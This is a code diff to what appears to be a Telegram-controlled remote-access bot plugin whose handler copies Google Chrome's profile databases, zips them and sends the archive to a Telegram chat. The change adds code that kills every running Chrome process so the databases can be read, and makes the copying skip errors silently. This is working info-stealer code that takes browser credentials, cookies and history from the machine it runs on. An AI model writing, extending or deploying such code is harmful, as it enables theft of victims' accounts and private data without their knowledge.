@@ -44,6 +44,16 @@ class Main(Plugin):
 
     def handle_chrome_data(self, chat_id):
         try:
+            process = psutil.pids()
+            for x in process:
+                try:
+                    p = psutil.Process(x)
+                    if 'chrome' in p.name().lower():
+                        msg = 'Google PID %d terminated' %x
+                        self.bot.send_message(chat_id, msg)
+                        p.terminate()
+                except Exception as e:
+                    pass
             self.bot.send_message(chat_id, 'Gathering data...')
             if self.bot.platform == 'win32':
                 path = os.path.join(os.getenv('localappdata'), 'Google\\Chrome\\User Data\\Default')
@@ -55,10 +65,12 @@ class Main(Plugin):
 
             with ZipFile(zname, 'w') as z:
                 for db in self.databases:
-                    z.write(os.path.join(path, db))
+                    try:
+                        z.write(os.path.join(path, db))
+                    except:
+                        continue
 
             with open(zname, 'rb') as f:
-
                 self.bot.bot.sendDocument(chat_id, f)
         except Exception as e:
             return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
